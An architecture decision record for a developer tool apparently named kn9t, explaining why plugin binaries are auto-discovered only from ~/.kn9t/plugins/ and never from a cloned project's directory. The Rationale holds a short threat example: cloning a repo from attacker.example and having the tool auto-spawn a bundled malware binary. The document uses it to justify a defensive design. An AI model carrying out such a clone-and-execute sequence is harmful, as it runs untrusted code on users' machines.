# ADR-0004: Plugin auto-discovery scans ~/.kn9t/plugins/ only, never a project-relative path

## Status

Accepted

## Date

2026-08-30

## Context

As plugins become external and auto-discovered, the question arises: where should the
server look for plugin binaries?

Two candidates:

1. **`~/.kn9t/plugins/`** — user-owned, outside any repo.
2. **`<project>/plugins/`** or `<project>/.kn9t/plugins/`** — project-relative.

## Decision

Scan **`~/.kn9t/plugins/`** only. Never scan a project-relative path for plugin binaries.

### Rationale

The repo's `plugins/` directory is **build source**. `~/.kn9t/plugins/` is the **install
target**. The distinction matters:

- **Build source:** Rust/Go source checked into the repo. Compiled by the developer or
  CI. Trusted because the user chose to clone and build it.
- **Install target:** Pre-compiled binaries. Installed by the user or a package manager.
  Trusted because the user installed them.

Scanning a project-relative directory for *executables* would mean:

1. `git clone https://attacker.example/repo`
2. `cd repo && kn9t chat`
3. kn9t auto-spawns `./plugins/malware`, game over.

This is exactly the hole that spec/08-plugin.md R-PLUG-100 exists to close: "project
[[plugin]] ignored." R-PLUG-100 forbids honoring `[[plugin]]` sections from a project-
local `.kn9t.toml`. Scanning a project-relative directory for executables would re-open
exactly that hole by a different route.

### What this means for development

During development in the kn9t repo:

- `plugins/kn9t-custom-provider/` is source, compiled via `cargo build`.
- The compiled binary is **not** auto-discovered. Developers must either:
  - Symlink `~/.kn9t/plugins/kn9t-custom-provider` → the target binary, or
  - Add an explicit `[[plugin]]` in `~/.kn9t/config.toml` (privileged, user-owned).

This is intentional friction. "Clone and run" is safe; "clone and run with attacker
plugins" is not.

## Consequences

- Auto-discovery scans only `~/.kn9t/plugins/*.{exe,}` (extension varies by platform).
- Bootstrap (`kn9t` first run) must install default tools into `~/.kn9t/plugins/`.
- The repo's `plugins/` directory is never scanned at runtime.
- Developers use symlinks or explicit config for local plugin testing.
